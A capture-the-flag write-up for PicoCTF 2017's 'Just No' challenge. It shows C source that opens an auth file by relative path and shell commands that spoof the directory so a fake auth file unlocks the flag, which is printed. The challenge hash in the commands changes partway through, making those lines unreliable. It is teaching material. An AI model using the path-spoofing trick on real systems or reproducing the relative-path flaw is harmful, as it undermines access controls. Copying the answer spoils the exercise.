# PicoCTF_2017: Just No

**Category:** Binary Exploitation
**Points:** 40
**Description:**

>A program at /problems/ec9da1496f80c8248197ba564097cebb has access to a flag but refuses to share it. Can you convince it otherwise?

**Hint:**

>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

## Write-up
Hmm, let's get the flag.

    $ /problems/ec9da1496f80c8248197ba564097cebb/justno
    auth file says no. So no. Just... no. 

Damn it. Let's take a look at the source code. Wait.

**Source Code**

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){ 
  FILE* authf = fopen("../../problems/ec9da1496f80c8248197ba564097cebb/auth","r"); //access auth file in ../../../problems/ec9da1496f80c8248197ba564097cebb
  if(authf == NULL){
    printf("could not find auth file in ../../problems/ec9da1496f80c8248197ba564097cebb/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/ec9da1496f80c8248197ba564097cebb/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
}
```

    FILE* authf = fopen("../../problems/ec9da1496f80c8248197ba564097cebb/auth","r")

Haha! Relative paths! Now we can simply spoof a directory structure and make a fake auth file.

    $ cd ~
    $ mkdir problems
    $ mkdir problems/ec9da1496f80c8248197ba564097cebb
    $ cd problems/7e8b456c98db60be9a33339ab4509fca
    $ echo "yes" > auth
    $ /problems/7e8b456c98db60be9a33339ab4509fca/justno
    Oh. Well the auth file doesn't say no anymore so... Here's the flag: ddf649b13d560409d2649dc06f2a43ee

Therefore, the flag is `ddf649b13d560409d2649dc06f2a43ee`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTI3NTk0ODIyMCwxMzE1NDQ3OTY2XX0=
-->